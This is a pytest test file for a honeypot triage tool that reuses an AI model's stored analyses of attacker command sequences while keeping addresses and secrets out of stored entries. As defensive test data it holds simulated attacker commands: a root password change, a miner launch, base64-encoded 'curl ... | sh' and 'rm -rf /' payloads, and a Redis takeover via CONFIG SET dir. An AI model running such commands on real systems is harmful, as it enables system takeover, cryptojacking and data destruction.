"""Stored triage analyses: a repeated command sequence reuses one model answer."""

from __future__ import annotations

import base64
import datetime
import json
import os
import stat

import pytest

from agent_fakes import T0, FakeJsonLLM, ssh_session, trap_event, write_log

from agents import analyses, triage
from agents.analyses import AnalysisStore
from agents.llm import BudgetedJsonLLM, DailyCallCounter, LLMUnavailable
from agents.sessions import parse_log
from agents.triage import TriageRecord, digest, load_records, run_triage, triage_session

LATER = T0 + datetime.timedelta(days=1)
DAY = 86400.0

PW1, PW2 = "Xk3aB9qLm2Zr7TfW1pYs", "Qw8eRt5YuI0oPa2SdF6g"
HEX1, HEX2 = "a" * 8 + "0123456789abcdef" + "b" * 8, "c" * 8 + "fedcba9876543210" + "d" * 8


def script(pw: str, key: str) -> list[str]:
    return ["uname -a", f'echo "root:{pw}" | chpasswd', f"./miner -k {key}"]


def answer(pw: str, key: str, **kw) -> dict:
    return {**ANSWER, "headline": f"Miner started with key {key}",
            "actions": [f"Changed the root password to {pw}.", "Checked the kernel version."],
            **kw}


PLAIN = {"intent": "RECONNAISSANCE", "stage": "DISCOVERY", "skill": "LOW",
         "judgement": "SUSPICIOUS", "headline": "Hardware check", "actions": ["Read the CPU."]}


ANSWER = {
    "intent": "CRYPTOMINING", "stage": "EXECUTION", "skill": "LOW", "judgement": "MALICIOUS",
    "techniques": [{"id": "T1496", "name": "Resource Hijacking"}],
    "extra_iocs": [{"type": "md5", "value": HEX1}],
    "headline": f"Miner started with key {HEX1}",
    "actions": [f"Changed the root password to {PW1}.", "Checked the kernel version."],
    "assessment": ["A mining bot."], "not_seen": ["persistence"],
}


class Clock:
    def __init__(self, t: float = 1_800_000_000.0) -> None:
        self.t = t

    def __call__(self) -> float:
        return self.t


def _store(tmp_path, clock=None, **kw) -> AnalysisStore:
    return AnalysisStore(tmp_path / "state" / analyses.FILE_NAME, clock=clock or Clock(), **kw)


def _run(tmp_path, records, llm, store, name="log.jsonl", **kw):
    log = write_log(tmp_path / name, records)
    reports = tmp_path / "reports"
    return run_triage(log, reports, llm, now=LATER, state_dir=tmp_path / "state",
                      analyses_store=store, **kw), reports


def _by_ip(reports) -> dict[str, TriageRecord]:
    return {r.src_ip: r for r in load_records(reports)}


def _texts(r: TriageRecord) -> str:
    return " ".join([r.headline, r.narrative, *r.actions, *r.assessment, *r.not_seen])


def _two_sessions(user2="root", cmds2=None):
    return (ssh_session("session-1", "203.0.113.10", script(PW1, HEX1), start=0)
            + ssh_session("session-2", "198.51.100.20", cmds2 or script(PW2, HEX2), start=5, user=user2,
                          password="hunter2pass"))


# ---- reuse ------------------------------------------------------------------------------

def test_same_script_from_two_sources_makes_one_call_with_each_sources_tokens(tmp_path):
    llm = FakeJsonLLM(ANSWER)
    store = _store(tmp_path)
    result, reports = _run(tmp_path, _two_sessions(), llm, store)
    assert len(llm.calls) == 1 and result["llm_calls"] == 1 and result["analyses_reused"] == 1
    recs = _by_ip(reports)
    first, second = recs["203.0.113.10"], recs["198.51.100.20"]
    assert first.llm_used and not first.analysis_reused
    assert second.analysis_reused and not second.llm_used
    assert first.analysis_key == second.analysis_key and len(second.analysis_key) == 16
    assert HEX2 in second.headline and PW2 in second.actions[0]
    assert HEX1 not in _texts(second) and PW1 not in _texts(second)
    assert "203.0.113.10" not in second.model_dump_json()
    assert (second.intent.value, second.judgement.value) == ("CRYPTOMINING", "MALICIOUS")
    assert [t.id for t in second.techniques] == ["T1496"]
    # IOCs come from each session's own commands; the model's IOCs are not reused.
    assert {i.value for i in second.iocs if i.type.value == "md5"} == {HEX2}
    assert {i.value for i in first.iocs if i.type.value == "md5"} == {HEX1}
    mode = stat.S_IMODE(os.stat(tmp_path / "state" / analyses.FILE_NAME).st_mode)
    assert mode == 0o600
    saved = AnalysisStore(tmp_path / "state" / analyses.FILE_NAME)
    entry = next(iter(saved.entries.values()))
    assert entry["uses"] == 1 and "extra_iocs" not in entry["out"]
    assert HEX1 not in json.dumps(entry) and PW1 not in json.dumps(entry)
    assert saved.counts()["total"] == 1


def test_a_different_script_misses(tmp_path):
    llm = FakeJsonLLM(ANSWER)
    _run(tmp_path, _two_sessions(cmds2=["cat /proc/cpuinfo"]), llm, _store(tmp_path))
    assert len(llm.calls) == 2


def test_a_changed_prompt_misses(tmp_path, monkeypatch):
    llm = FakeJsonLLM(ANSWER)
    _run(tmp_path, ssh_session("session-1", "203.0.113.10", script(PW1, HEX1)), llm, _store(tmp_path))
    monkeypatch.setattr(triage, "REUSE_PROMPT", triage.REUSE_PROMPT + " changed")
    _run(tmp_path, ssh_session("session-2", "198.51.100.20", script(PW2, HEX2), start=5), llm,
         _store(tmp_path), name="log2.jsonl")
    assert len(llm.calls) == 2


def test_entries_expire_by_age_and_by_uses(tmp_path):
    clock = Clock()
    llm = FakeJsonLLM(ANSWER)
    _run(tmp_path, ssh_session("session-1", "203.0.113.10", script(PW1, HEX1)), llm,
         _store(tmp_path, clock, max_uses=1))
    _run(tmp_path, ssh_session("session-2", "198.51.100.20", script(PW2, HEX2), start=5), llm,
         _store(tmp_path, clock, max_uses=1), name="log2.jsonl")
    assert len(llm.calls) == 1
    _run(tmp_path, ssh_session("session-3", "198.51.100.30", script(PW2, HEX2), start=6), llm,
         _store(tmp_path, clock, max_uses=1), name="log3.jsonl")
    assert len(llm.calls) == 2                       # used up: asked again, entry renewed
    clock.t += 31 * DAY
    _run(tmp_path, ssh_session("session-4", "198.51.100.40", script(PW2, HEX2), start=7), llm,
         _store(tmp_path, clock), name="log4.jsonl")
    assert len(llm.calls) == 3                       # older than 30 days: asked again


def test_a_fresh_answer_that_disagrees_keeps_the_higher_judgement(tmp_path):
    clock = Clock()
    _run(tmp_path, ssh_session("session-1", "203.0.113.10", script(PW1, HEX1)), FakeJsonLLM(ANSWER),
         _store(tmp_path, clock))
    clock.t += 31 * DAY
    benign = answer(PW2, HEX2, judgement="BENIGN")
    _run(tmp_path, ssh_session("session-2", "198.51.100.20", script(PW2, HEX2), start=5),
         FakeJsonLLM(benign), _store(tmp_path, clock), name="log2.jsonl")
    entry = next(iter(_store(tmp_path, clock).entries.values()))
    assert entry["out"]["judgement"] == "MALICIOUS" and entry["disagreements"] == 1


# ---- floors ------------------------------------------------------------------------------

def _sessions(tmp_path, records):
    log = write_log(tmp_path / "floor.jsonl", records)
    return parse_log(log).sessions


def test_a_reused_answer_never_lowers_the_rule_floor(tmp_path):
    benign = dict(ANSWER, judgement="BENIGN", stage="DISCOVERY")
    store = _store(tmp_path)
    ss = _sessions(tmp_path, ssh_session("session-1", "203.0.113.10", script(PW1, HEX1))
                   + ssh_session("session-2", "198.51.100.20", script(PW2, HEX2), start=5,
                                 password="planted-secret-value"))
    llm = FakeJsonLLM(benign)
    first = triage_session(ss["session-1"], llm, {}, store=store)
    second = triage_session(ss["session-2"], llm, {"planted-secret-value": "db_password"}, store=store)
    assert len(llm.calls) == 1 and first.judgement.value == "BENIGN"
    assert second.analysis_reused and second.judgement.value == "MALICIOUS"
    assert second.honeytokens == ["db_password"] and not second.llm_used


def _redis(ip: str, task: str, minutes: float) -> list[dict]:
    return [trap_event("redis", "auth_attempt", ip, task, minutes=minutes, username="default",
                       password="redis", success=True),
            trap_event("redis", "command", ip, task, minutes=minutes + 0.1,
                       data={"input": "CONFIG SET dir /root/.ssh", "high_signal": True,
                             "signal": "redis_takeover"})]


def test_a_reused_campaign_answer_keeps_the_deterministic_floor(tmp_path):
    benign = dict(ANSWER, judgement="BENIGN", stage="RECONNAISSANCE", headline="Redis probe",
                  actions=["Set a directory."])
    llm = FakeJsonLLM(benign)
    result, reports = _run(tmp_path, _redis("192.0.2.20", "r0", 0) + _redis("192.0.2.21", "r1", 1),
                           llm, _store(tmp_path))
    recs = load_records(reports)
    assert len(llm.calls) == 1 and result["analyses_reused"] == 1
    reused = next(r for r in recs if r.analysis_reused)
    assert reused.judgement.value == "MALICIOUS" and reused.stage.value == "PERSISTENCE"
    assert reused.headline == "Redis probe" and not reused.llm_used


# ---- refusals ----------------------------------------------------------------------------

def test_an_answer_naming_its_source_address_is_not_stored(tmp_path):
    named = dict(ANSWER, assessment=["A bot from 203.0.113.10."])
    llm = FakeJsonLLM(named)
    _, reports = _run(tmp_path, _two_sessions(), llm, _store(tmp_path))
    assert len(llm.calls) == 2
    assert not any(r.analysis_reused or r.analysis_key for r in load_records(reports))


def test_an_answer_naming_an_address_from_the_replies_is_not_stored(tmp_path):
    named = dict(ANSWER, assessment=["Saw 192.0.2.77 in the output."])
    llm = FakeJsonLLM(named)
    _run(tmp_path, _two_sessions(), llm, _store(tmp_path))
    assert len(llm.calls) == 2


def test_credentials_the_model_never_saw_do_not_block_storing(tmp_path):
    llm = FakeJsonLLM(answer(PW1, HEX1, assessment=["Logged in as root with a password."]))
    store = _store(tmp_path)
    ss = _sessions(tmp_path, ssh_session("session-1", "203.0.113.10", script(PW1, HEX1),
                                         password="root")
                   + ssh_session("session-2", "198.51.100.20", script(PW1, HEX1), start=5,
                                 password="password"))
    first = triage_session(ss["session-1"], llm, {}, store=store)
    second = triage_session(ss["session-2"], llm, {}, store=store)
    assert len(llm.calls) == 1 and first.analysis_key and second.analysis_reused


@pytest.mark.parametrize("src, text", [
    ("2001:db8:1:2::/64", "A bot in 2001:db8:1:2."),
    ("2001:db8:1:2::/64", "A bot at 2001:db8:1:2::9."),
    ("203.0.113.10", "A bot at 203[.]0[.]113[.]10."),
    ("203.0.113.10", "Reported 198.51.100.77 (dot) style: 198(.)51(.)100(.)77."),
    ("203.0.113.10", "Talked to 2001:db8:ffff::1 after login."),
])
def test_an_answer_naming_an_address_in_another_spelling_is_not_stored(src, text):
    keyed = analyses.make_key("session", "ssh", "p", {}, ['{"cmd": "uname -a"}'])
    out = {k: v for k, v in PLAIN.items()} | {"techniques": [], "assessment": [text],
                                               "not_seen": [], "narrative": ""}
    assert analyses.storable(out, keyed, src_ips=[src, "2001:db8:1:2::9"], username=None,
                             ioc_values=triage._ioc_values) is None
    clean = out | {"assessment": ["A bot ran uname at 12:30:45."]}
    assert analyses.storable(clean, keyed, src_ips=[src], username=None,
                             ioc_values=triage._ioc_values) is not None


def test_two_tokens_in_one_text_are_not_stored(tmp_path):
    llm = FakeJsonLLM(dict(ANSWER, headline=f"Key {HEX1} and password {PW1}"))
    _run(tmp_path, _two_sessions(), llm, _store(tmp_path))
    assert len(llm.calls) == 2


def test_text_naming_the_username_is_served_only_to_that_username(tmp_path):
    llm = FakeJsonLLM(dict(ANSWER, assessment=["Logged in as root and mined."]))
    _, reports = _run(tmp_path, _two_sessions(user2="admin")
                      + ssh_session("session-3", "198.51.100.30", script(PW2, HEX2), start=9), llm,
                      _store(tmp_path))
    recs = _by_ip(reports)
    assert len(llm.calls) == 2                      # admin asked; root (s3) reused
    assert recs["198.51.100.30"].analysis_reused
    assert not recs["198.51.100.20"].analysis_reused


def test_encoded_payloads_stay_in_the_key(tmp_path):
    def enc(cmd: str) -> str:
        return base64.b64encode(cmd.encode()).decode()

    a = [f"echo {enc('curl -s http://198.51.100.5/a | sh')} | base64 -d | sh"]
    b = [f"echo {enc('rm -rf / --no-preserve-root now')} | base64 -d | sh"]
    llm = FakeJsonLLM(ANSWER | {"headline": "Ran a payload", "actions": ["Decoded a script."]})
    _run(tmp_path, ssh_session("session-1", "203.0.113.10", a)
         + ssh_session("session-2", "198.51.100.20", b, start=5), llm, _store(tmp_path))
    assert len(llm.calls) == 2
    keyed = analyses.make_key("session", "ssh", "p", {}, [f"echo {enc('readable text here')} > /tmp/a"])
    assert keyed.values == ()                      # a token that decodes to text stays literal


# ---- budgets and model state -------------------------------------------------------------

def test_reused_answers_do_not_touch_either_call_counter(tmp_path):
    inner = FakeJsonLLM(ANSWER)
    daily = DailyCallCounter(tmp_path / "calls.json", limit=100)
    llm = BudgetedJsonLLM(inner, max_calls_per_run=1, daily=daily)
    records = _two_sessions() + ssh_session("session-3", "198.51.100.30", script(PW2, HEX2), start=9)
    result, reports = _run(tmp_path, records, llm, _store(tmp_path), max_llm_calls=1)
    assert len(inner.calls) == 1 and llm.calls == 1 and daily.peek()["calls"] == 1
    assert len(result["written"]) == 3 and result["deferred"] == []
    assert result["llm_calls"] == 1 and result["analyses_reused"] == 2


def test_stored_answers_are_served_while_the_model_is_unavailable(tmp_path):
    _run(tmp_path, ssh_session("session-1", "203.0.113.10", script(PW1, HEX1)), FakeJsonLLM(ANSWER),
         _store(tmp_path))
    down = FakeJsonLLM(LLMUnavailable("down"))
    result, reports = _run(tmp_path, ssh_session("session-0", "198.51.100.9", ["id"])
                           + ssh_session("session-2", "198.51.100.20", script(PW2, HEX2), start=5),
                           down, _store(tmp_path), name="log2.jsonl")
    assert result["deferred"] == ["session-0"] and result["analyses_reused"] == 1
    assert _by_ip(reports)["198.51.100.20"].analysis_reused


def test_no_model_configured_means_no_reuse(tmp_path):
    _run(tmp_path, ssh_session("session-1", "203.0.113.10", script(PW1, HEX1)), FakeJsonLLM(ANSWER),
         _store(tmp_path))
    result, reports = _run(tmp_path, ssh_session("session-2", "198.51.100.20", script(PW2, HEX2),
                                                 start=5), None, _store(tmp_path),
                           name="log2.jsonl")
    assert result["analyses_reused"] == 0
    assert not _by_ip(reports)["198.51.100.20"].analysis_reused


def test_a_dry_run_writes_no_store(tmp_path):
    _run(tmp_path, _two_sessions(), FakeJsonLLM(ANSWER), _store(tmp_path), dry_run=True)
    assert not (tmp_path / "state" / analyses.FILE_NAME).exists()


# ---- the file ----------------------------------------------------------------------------

def test_a_corrupt_store_starts_empty_and_is_replaced(tmp_path, caplog):
    path = tmp_path / "state" / analyses.FILE_NAME
    path.parent.mkdir(parents=True)
    path.write_text("{not json")
    store = _store(tmp_path)
    assert store.entries == {} and store.read_error
    assert "starting empty" in caplog.text
    _run(tmp_path, _two_sessions(), FakeJsonLLM(ANSWER), store)
    assert len(AnalysisStore(path).entries) == 1


def test_malformed_entries_are_dropped_on_read(tmp_path):
    path = tmp_path / "state" / analyses.FILE_NAME
    path.parent.mkdir(parents=True)
    path.write_text(json.dumps({"version": analyses.FILE_VERSION, "entries": {
        "f" * 64: {"kind": "session"}, "../x": {}, "e" * 64: "text"}}))
    assert _store(tmp_path).entries == {}


def test_entries_are_bounded_and_least_recently_used_go_first(tmp_path, monkeypatch):
    clock = Clock()
    store = _store(tmp_path, clock, max_entries=2)
    for i, cmd in enumerate(["a", "b", "c"]):
        keyed = analyses.make_key("session", "ssh", "p", {}, [cmd])
        stored = analyses.storable(dict(ANSWER, headline=cmd, actions=[], extra_iocs=None) | {
            "narrative": ""}, keyed, src_ips=[], username=None,
            ioc_values=lambda t: [])
        clock.t += 1
        assert store.put(keyed, *stored)
    store.save()
    kept = AnalysisStore(store.path, max_entries=2).entries
    assert sorted(e["out"]["headline"] for e in kept.values()) == ["b", "c"]
    monkeypatch.setattr(analyses, "MAX_ENTRY_BYTES", 100)
    keyed = analyses.make_key("session", "ssh", "p", {}, ["d"])
    assert not store.put(keyed, *analyses.storable(
        {k: v for k, v in ANSWER.items() if k != "extra_iocs"} | {"narrative": "x" * 200,
                                                                  "actions": [],
                                                                  "headline": "d"},
        keyed, src_ips=[], username=None, ioc_values=lambda t: []))


def test_settings_defaults_and_bounds():
    from configparser import ConfigParser

    cp = ConfigParser()
    assert analyses.settings(cp) == analyses.ReuseSettings(True, 30, 0, 5000)
    cp.read_string("[agents]\nanalysis_reuse = false\nanalysis_reuse_days = 7\n"
                   "analysis_reuse_max_uses = 3\nanalysis_reuse_max_entries = 999999\n")
    assert analyses.settings(cp) == analyses.ReuseSettings(False, 7, 3, analyses.MAX_ENTRIES_LIMIT)
    cp["agents"]["analysis_reuse_days"] = "0"
    with pytest.raises(ValueError):
        analyses.settings(cp)


# ---- records, digest, operator command -----------------------------------------------------

def test_an_older_record_without_the_new_fields_loads():
    rec = {"kind": "session", "id": "s", "protocol": "ssh", "src_ip": "203.0.113.1",
           "intent": "RECONNAISSANCE", "stage": "DISCOVERY", "skill": "LOW",
           "judgement": "SUSPICIOUS", "narrative": "old", "llm_used": True}
    r = TriageRecord.model_validate(rec)
    assert r.analysis_reused is False and r.analysis_key == ""


def test_digest_counts_reused_analyses(tmp_path):
    _, reports = _run(tmp_path, _two_sessions(), FakeJsonLLM(ANSWER), _store(tmp_path))
    text = digest(reports, day=T0.date().isoformat(), dry_run=True)
    assert "LLM-triaged: 2." in text and "Analyses reused: 1 " in text


def test_the_triage_command_builds_the_store_only_when_on_and_with_a_model(tmp_path):
    from configparser import ConfigParser

    from agents.__main__ import _analyses_store

    cp = ConfigParser()
    store = _analyses_store(cp, tmp_path, object())
    assert isinstance(store, AnalysisStore) and store.path == tmp_path / analyses.FILE_NAME
    assert _analyses_store(cp, tmp_path, None) is None
    cp.read_string("[agents]\nanalysis_reuse = false\n")
    assert _analyses_store(cp, tmp_path, object()) is None
    cp["agents"]["analysis_reuse"] = "true"
    cp["agents"]["analysis_reuse_days"] = "-1"
    assert _analyses_store(cp, tmp_path, object()) is None


def _cli(tmp_path, *extra):
    from agents.__main__ import _run as main_run

    cfg = tmp_path / "config.ini"
    cfg.write_text("[agents]\nanalysis_reuse_days = 30\n")
    return main_run(["analyses", "--config", str(cfg), "--state-dir", str(tmp_path / "state"),
                     *extra])["analyses"]


def test_cli_stats_list_forget_and_clear(tmp_path):
    _run(tmp_path, _two_sessions(cmds2=["cat /proc/cpuinfo"]) + ssh_session(
        "session-3", "198.51.100.30", script(PW2, HEX2), start=9), FakeJsonLLM(ANSWER, PLAIN),
         _store(tmp_path))
    stats = _cli(tmp_path, "--stats")
    assert stats["entries"] == 2 and stats["calls_saved_total"] == 1
    listing = _cli(tmp_path, "--list")["text"]
    assert "MALICIOUS" in listing and "key {1}" in listing and HEX1 not in listing
    assert "error" in _cli(tmp_path, "--forget", "../../etc")
    sid = next(iter(_store(tmp_path).entries))[:16]
    assert _cli(tmp_path, "--forget", sid)["forgotten"] is True
    assert _cli(tmp_path, "--forget", sid)["forgotten"] is False
    assert _cli(tmp_path, "--clear")["cleared"] == 1
    assert _store(tmp_path).entries == {}


def test_a_token_from_the_replies_is_not_stored_when_the_key_has_no_values(tmp_path):
    boot_id = "3f2a9c1e-8b7d-4e6f-9a0b-1c2d3e4f5a6b"
    cmd = ["cat /proc/sys/kernel/random/boot_id"]
    llm = FakeJsonLLM(PLAIN | {"headline": f"Read the boot id {boot_id}"})
    _, reports = _run(tmp_path, ssh_session("session-1", "203.0.113.10", cmd)
                      + ssh_session("session-2", "198.51.100.20", cmd, start=5), llm,
                      _store(tmp_path))
    assert len(llm.calls) == 2                      # not stored: the second session asks
    assert not any(r.analysis_reused or r.analysis_key for r in load_records(reports))
    keyed = analyses.make_key("session", "ssh", "p", {}, [json.dumps({"cmd": cmd[0]})])
    assert keyed.values == ()
    out = PLAIN | {"techniques": [], "assessment": [], "not_seen": [], "narrative": "",
                   "headline": f"Read the boot id {boot_id}"}
    assert analyses.storable(out, keyed, src_ips=[], username=None,
                             ioc_values=triage._ioc_values) is None
    assert analyses.storable(out | {"headline": "Read the boot id"}, keyed, src_ips=[],
                             username=None, ioc_values=triage._ioc_values) is not None
